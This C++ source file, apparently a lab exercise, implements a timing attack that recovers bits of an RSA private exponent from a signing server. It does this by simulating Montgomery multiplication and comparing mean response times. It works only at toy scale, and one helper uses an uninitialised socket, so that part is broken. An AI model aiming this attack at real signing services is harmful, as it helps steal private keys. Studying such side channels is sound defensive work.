#include "attacker.h"


int main(int argc, char *argv[]){
    // Print usage
    if (argc != 6) {
        printf("usage:  ./attacker <host> <port> <e> <n> <number of messages>\n");
        exit(1);
    }

    Attacker a = Attacker(argv[1], atoi(argv[2]));
    a.public_e = atoi(argv[3]);
    a.public_n = atoi(argv[4]);
    a.derived_exponent = 78;
    a.messages_per_bit = atoi(argv[5]);
    printf("Attacking server %s:%s. Using public exponent %s and modulus %s\n", argv[1], argv[2], argv[3], argv[4]);
    a.perform_attack();
    //Start attack: number of messages, exponent, bit of exponent
//    simulate_attack(atoi(argv[3]),atoi(argv[4]),atoi(argv[5]));


    //Attacker attacker(argv[1], atoi(argv[2]));
    //attacker.perform_attack();
    return 0;
}

/*
 * Performs a timing attack on the server
 */
void Attacker::perform_attack(){
//    TimedResponse a, b, c;
//    a = sign_message("25");
//    b = sign_message("30");
//    c = sign_message("123123123");
//    std::cout << a << b << c;

    attack_next_bit();
}

/*
 * Ask the server to sign @message, recording the time spent by the server.
 */
TimedResponse Attacker::sign_message(const std::string &message){
    // Record start and end time in nanoseconds.
    std::chrono::time_point<std::chrono::system_clock, std::chrono::duration<long long, std::ratio<1, 1000000000l> > > start, end;
    TimedResponse result;
    result.message = message;
    ssize_t n;
    char response[255];
    // Send mesage!
    start = std::chrono::system_clock::now();
    sendto(sock,message.c_str(),message.size(), 0, (struct sockaddr *)&server_addr,sizeof(server_addr));
    // Receive response!
    n = recv(sock,response,255,0);
    end = std::chrono::system_clock::now();
    response[n] = 0; // Null terminate received string
    result.response = response;
    result.duration = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start);
    return result;
}

TimedResponse Attacker::sign_message(const int message){
    return sign_message(std::to_string(message));
}

/*
 * Simulates Montgomery Modular exponentiation. Returns whether the MonPro calculation involved a
 * subtraction or not, on the last bit.
 */
bool Attacker::ModExpBoolean(const num &M, const num &d, const num &n){
    if (n%2 != 1) {
        std::cout << "Warning! Exponentiation failed. Modulus must be odd!" << std::endl;
        return false;
    }
    bool step4 = false, _ = false;
    num r, nprime;
    Rsa::nPrime(n, r, nprime);
    num M_bar = (M * r) % n;
    num x_bar = r%n;

    long k = Rsa::numBits(d) - 1; // Loop over bit indices. [0, k-1]
    for (; k >= 0 ; k--) {
        x_bar = MontgomeryProduct(x_bar, x_bar, nprime, r, n, _);
        if (d.GetBit(k)){
            x_bar = MontgomeryProduct(M_bar, x_bar, nprime, r, n, _);
            if (k == 0) {
                step4 = _;
            }
        }
    }
    return step4;
}


num Attacker::MontgomeryProduct(const num &a, const num &b, const num &nprime, const num &r, const num &n, bool &step4){
    num t = a * b;
    num m = t * nprime % r;
    num u = (t + m*n)/r;
    if(u >=n) {
        step4 = true;
        return u-n;
    }
    else {
        step4 = false;
        return u;
    }
}


TimedResponse sign_message2(const std::string &message){
    int sock;
    int server_addr;
    // Record start and end time in nanoseconds.
    std::chrono::time_point<std::chrono::system_clock, std::chrono::duration<long long, std::ratio<1, 1000000000l> > > start, end;
    TimedResponse result;
    result.message = message;
    ssize_t n;
    char response[255];
    // Send mesage!
    start = std::chrono::system_clock::now();
    sendto(sock,message.c_str(),message.size(), 0, (struct sockaddr *)&server_addr,sizeof(server_addr));
    // Receive response!
    n = recv(sock,response,255,0);
    end = std::chrono::system_clock::now();
    response[n] = 0; // Null terminate received string
    result.response = response;
    result.duration = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start);
    return result;
}




/*
*  Divide messages into two list.
*/
void Attacker::attack_next_bit() {
    //The two sets
    std::vector<int> set_true;
    std::vector<int> set_false;

    //Simulate messages
    printf("simulating exponentiation - dividing messages into two sets.\n");
    int guess = (derived_exponent << 1) + 1; // Guess that the next bit is 1.
    printf("current guess: %d\n", guess);
    for( int i = 0; i < messages_per_bit; i++ ) {
        int random_message = (rand() % public_n) ;
        bool v = ModExpBoolean(random_message, guess, public_n);
        if(v){
            set_true.push_back(random_message);
        }
        else{
            set_false.push_back(random_message);
        }
    }

    /*
    * Calculate mean time for each set
    */
    std::cout<<"Requsting signatures from server..."<<"\n";
    long long tTrue = 0,tFalse = 0;
    for(int message: set_true){
        TimedResponse t = sign_message(message);
        tTrue += t.duration.count();
    }

    for( int message: set_false){
        TimedResponse t = sign_message(message);
        tFalse+=t.duration.count();
    }
    tTrue /= set_true.size();
    tFalse /= set_false.size();

    /* At this point we decide whether we guessed correctly or not.
     * If the bit was indeed 1, set derived_exponent = guess.
     * Otherwise, set derived_exponent = guess-1.
     */

    printf("Average time true set: \t\t%d ns.\n", tTrue);
    printf("Average time false set: \t%d ns. \n", tFalse);
    printf("Ratio True/False time: \t\t%f", (tTrue*1.0)/tFalse);
}